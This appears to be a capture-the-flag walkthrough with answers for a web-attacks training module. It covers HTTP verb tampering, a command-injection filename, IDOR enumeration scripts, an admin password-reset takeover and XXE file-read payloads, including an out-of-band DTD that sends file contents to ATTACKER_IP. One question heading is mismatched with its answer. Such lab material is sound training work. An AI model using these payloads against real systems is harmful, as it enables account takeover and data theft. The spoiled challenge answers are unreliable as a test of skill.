# Web Attacks

---

## Question:

**Try to use what you learned in this section to access the `reset.php` page and delete all files. Once all files are deleted, you should get the flag.**

### Answer / Steps

1. Visit the website and submit any input.
2. Click **Reset**.
3. Intercept the request in **Burp Suite**.
4. Send the request to **Repeater**.
5. Modify the HTTP method from `GET` to `DELETE`.
6. Send the request.
7. In the **Proxy tab**, drop the response.
8. The flag is returned.

---

## Question:

**To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename:**
`file; cp /flag.txt ./`

### Answer / Steps

1. Input the payload:

   ```
   file; cp /flag.txt ./
   ```
2. Intercept the request in Burp.
3. Change the request method from `GET` to `POST`.

   * Right-click → **Change request method**
4. Forward the request.
5. Visit:

   ```
   /flag.txt
   ```
6. Flag is displayed.

---

## Question:

**Repeat what you learned in this section to get a list of documents of the first 20 user uid's in `/documents.php`, one of which contains a `.txt` file with the flag.**

### Answer / Steps

1. Intercept request to `/documents.php`.
2. Send request to **Burp Intruder**.
3. Add payload position:

   ```
   uid=§1§
   ```
4. Payload: numbers **1 → 20**.
5. Start attack.
6. Identify response with **largest Content-Length**.
7. View response → Raw tab → note file path.
8. Visit discovered file:

   ```
   /documents/flag_11dfa168ac8eb2958e38425728623c98.txt
   ```

---

## Question:

**To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename:**
`file; cp /flag.txt ./`

### Answer / Steps

1. Visit `/contracts.php`.
2. Intercept a request for `employee_contract.pdf`.
3. Observe parameter:

   ```
   contract=MQ%3D%3D
   ```
4. Decode URL → decode Base64 → value becomes `1`.

### Brute-force contracts (script)

```bash
#!/usr/bin/env bash

# Target URL
url="http://SERVER_IP:PORT"

for i in {1..20}; do
    # Base64 encode the number and URL-encode it
    hash=$(echo -n "$i" | base64 | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")

    # Show progress
    echo "ID: $i, hash: $hash"

    # Download the contract
    curl -sS -OJ "$url/download.php?contract=$hash"
done
```

```bash
# Search PDFs for the flag
pdfgrep -H "HTB" contract_*.pdf
```

---

## Question:

**Try to read the details of the user with `uid=5`. What is their `uuid` value?**

### Answer / Steps

1. Visit `/profile`.
2. Intercept **Update Profile** request.
3. Change:

   ```
   /profile/api.php/profile/1
   ```

   to:

   ```
   /profile/api.php/profile/5
   ```
4. Change `uid=1` → `uid=5`.
5. Send request → UUID returned.

---

## Question:

**Try to change the admin's email to `flag@idor.htb`, and you should get the flag on the edit profile page.**

### Answer / Steps

```bash
#!/usr/bin/env bash

# Target URL
url="http://SERVER_IP:PORT"

# Enumerate profiles
for i in {1..20}; do
    echo "--- User ID: $i ---"
    curl -sS "$url/profile/api.php/profile/$i" -H "Cookie: role=employee" | python3 -m json.tool 2>/dev/null
done
```

1. Identify admin user.
2. Intercept **Update Profile**.
3. Change method to `PUT`.
4. Modify endpoint:

   ```
   /profile/api.php/profile/ADMIN_ID
   ```
5. Replace email with `flag@idor.htb`.
6. Send → Flag displayed.

---

## Question:

**Try to read the details of the `connection.php` file and submit the `api_key`.**

### Answer / Steps (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY exploit SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
  <name>daye</name>
  <tel>000000</tel>
  <email>&exploit;</email>
  <message>hello</message>
</root>
```

1. Send via Burp Repeater.
2. Decode Base64 response.
3. Extract `api_key`.

---

## Question:

**Use CDATA or error-based XXE to read `/flag.php`.**

### Answer / Steps (External DTD)

**DTD file (`xxe.dtd`)**

```xml
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % end "]]>">
```

```bash
# Host the DTD
python3 -m http.server 8000
```

**Payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
  <email>&content;</email>
</root>
```

→ Decode response → Flag.

---

## Question:

**Using Blind Data Exfiltration on `/blind`, read `/327a6c4304ad5938eaf0efb6cc3e53dc.php`.**

### Answer / Steps

**DTD**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

**Listener**

```php
<?php
if(isset($_GET['content'])){
    error_log(base64_decode($_GET['content']));
}
?>
```

→ Send XXE → Read terminal → Flag.

---

## Question:

**Try to escalate privileges and exploit vulnerabilities to read `/flag.php`.**

### Answer / Steps

1. Inspect JS:

```js
fetch(`/api.php/user/${$.cookie("uid")}`)
```

2. Enumerate users:

```bash
curl http://SERVER_IP:PORT/api.php/user/ID -H "Cookie: PHPSESSID=SESSION"
```

3. Identify admin user.
4. Reset admin token:

```http
GET /api.php/token/ADMIN_ID
```

5. Reset password:

```http
GET /reset.php?uid=ADMIN_ID&token=TOKEN&password=password
```

6. Login as admin.
7. Inject XXE in `/addEvent.php`:

```xml
<!DOCTYPE email [
  <!ENTITY flag SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
]>
<root>
  <name>&flag;</name>
</root>
```

→ Decode → Flag.
